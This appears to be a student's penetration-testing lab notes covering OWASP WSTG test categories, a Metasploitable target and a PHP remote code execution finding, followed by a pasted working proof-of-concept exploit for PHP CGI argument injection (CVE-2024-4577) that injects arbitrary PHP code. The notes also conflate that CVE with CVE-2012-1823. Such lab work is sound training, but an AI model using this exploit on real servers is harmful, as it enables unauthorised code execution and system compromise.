**Protego Security Solutions Task**

There are many organizations that are dedicated to improving cybersecurity. They offer fantastic resources that are really helpful to us here at Protego. OWASP offers many resources and tools that are really awesome. They focus on web application security, so when you do application testing, you will find yourself turning to their resources often.

The OWASP WSTG is an amazing guide to testing for a really wide range of web application vulnerabilities, and offers concrete recommendations for threat mitigation. It is indispensable for making recommendations regarding vulnerabilities that we have discovered in our testing.

You should be familiar with it, so I want you to explore the WSTG website. After you check that out, we will do a brief vulnerability scan using the OWASP ZAP tool so you can see how it can work together with WSTG.

In this lab, you will complete the following objectives:

- Part 1: Investigate the WSTG
- Part 2: Scan a Website and Investigate Vulnerability References

What are the 12 categories of active testing described in the guide?

- Information Gathering
- Configuration and Deployment Management Testing
- Identity Management Testing
- Authentication Testing
- Authorization Testing
- Session Management Testing
- Input validation Testing
- Error Handling
- Cryptography
- Business Logic Testing
- Client-side Testing
- API Testing

metasploitable ip: 
172.17.0.2

https://arstechnica.com/security/2024/06/php-vulnerability-allows-attackers-to-run-malicious-code-on-windows-servers/

**Remote Code Execution â€“ CVE-2012-1823**

PHP code can be injected into a PHP query sting. This code can will execute at the PHP exec.

- Scroll down to the Alert Tags section of the vulnerability. Note the WSTG key and value. Click the value and use the Ctrl-C keys to copy the URL to the clipboard.
- Open a browser and paste the URL in the URL. Navigate to the WSTG site and read about the vulnerability and methods of testing for it. Review this information about the vulnerability to understand what WSTG offers to the penetration tester.

Remote code execution vulnerability (CVE-2012-1823) was caused by an out-of-date version of PHP.

Found an exploit that helped me understand what i was doing wrong, i needed to add -c and then it might work. 

```python
"""
PHP CGI Argument Injection (CVE-2024-4577) Remote Code Execution PoC
Discovered by: Orange Tsai (@orange_8361) of DEVCORE (@d3vc0r3)
Exploit By: Aliz (@AlizTheHax0r) and Sina Kheirkhah (@SinSinology) of watchTowr (@watchtowrcyber) 
Technical details: https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/?github
Reference: https://devco.re/blog/2024/06/06/security-alert-cve-2024-4577-php-cgi-argument-injection-vulnerability-en/
"""

banner = """			 __         ___  ___________                   
	 __  _  ______ _/  |__ ____ |  |_\\__    ____\\____  _  ________ 
	 \\ \\/ \\/ \\__  \\    ___/ ___\\|  |  \\|    | /  _ \\ \\/ \\/ \\_  __ \\
	  \\     / / __ \\|  | \\  \\___|   Y  |    |(  <_> \\     / |  | \\/
	   \\/\\_/ (____  |__|  \\___  |___|__|__  | \\__  / \\/\\_/  |__|   
				  \\/          \\/     \\/                            
	  
        watchTowr-vs-php_cve-2024-4577.py
        (*) PHP CGI Argument Injection (CVE-2024-4577) discovered by Orange Tsai (@orange_8361) of DEVCORE (@d3vc0r3)
          - Aliz Hammond, watchTowr (aliz@watchTowr.com)
          - Sina Kheirkhah (@SinSinology), watchTowr (sina@watchTowr.com)
        CVEs: [CVE-2024-4577]  """


import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
import requests
requests.packages.urllib3.disable_warnings()
import argparse

print(banner)
print("(^_^) prepare for the Pwnage (^_^)\n")

parser = argparse.ArgumentParser(usage="""python CVE-2024-4577 --target http://192.168.1.1/index.php -c "<?php system('calc')?>""")
parser.add_argument('--target', '-t', dest='target', help='Target URL', required=True)
parser.add_argument('--code', '-c', dest='code', help='php code to execute', required=True)
args = parser.parse_args()
args.target = args.target.rstrip('/')


s = requests.Session()
s.verify = False



res = s.post(f"{args.target.rstrip('/')}?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input", data=f"{args.code};echo 1337; die;" )
if('1337' in res.text ):
    print('(+) Exploit was successful')
else:
    print('(!) Exploit may have failed')
```